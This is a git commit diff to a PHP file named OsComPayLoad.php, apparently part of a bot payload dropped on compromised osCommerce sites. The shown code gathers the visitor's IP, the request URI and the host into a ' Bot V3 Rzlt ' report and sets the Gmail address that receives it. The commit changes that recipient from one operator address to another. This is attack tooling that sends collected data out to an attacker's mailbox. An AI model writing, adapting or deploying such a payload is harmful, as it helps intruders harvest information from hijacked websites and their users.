1c3d80bb1b2d206ef681e3697210afb2d10dd069
mrxmod <60251505+mrxmod@users.noreply.github.com>
2020-01-26 00:59:19 +0700

    Update OsComPayLoad.php

--- files/OsComPayLoad.php
+++ files/OsComPayLoad.php
@@ -37,7 +37,7 @@ echo "done .\n " ;
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = " Bot V3 Rzlt |$ip";
-$email = "sellerolux@gmail.com";
+$email = "mrxmod1337@gmail.com";
 $from = "From: Result<botv3@mrspybotv3.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
